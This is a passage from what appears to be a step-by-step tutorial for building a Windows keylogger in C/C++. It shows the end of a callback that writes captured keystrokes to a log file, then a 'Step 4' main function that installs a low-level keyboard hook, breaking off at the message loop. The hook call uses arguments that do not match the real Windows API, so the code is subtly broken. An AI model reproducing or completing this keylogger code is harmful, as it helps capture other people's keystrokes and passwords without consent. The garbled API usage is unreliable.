            logFile << "ASCII: " << (unsigned int)key << std::endl;
            logFile.close();

            lastKey = key;
        }
    }
}
```

### Step 4: Install the Keyboard Hook
Use `SetWindowsHook` to install the hook:
```c
int main() {
    HWND hwnd = GetDesktopWindow();
    int id = 0;
    HHOOK hhook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, KeyCallback);

    if (hhook == 0) {
        std::cout << "Failed to install hook." << std::endl;
        return 1;
    }

    // Keep the hook active while the application is running
    MSG msg;
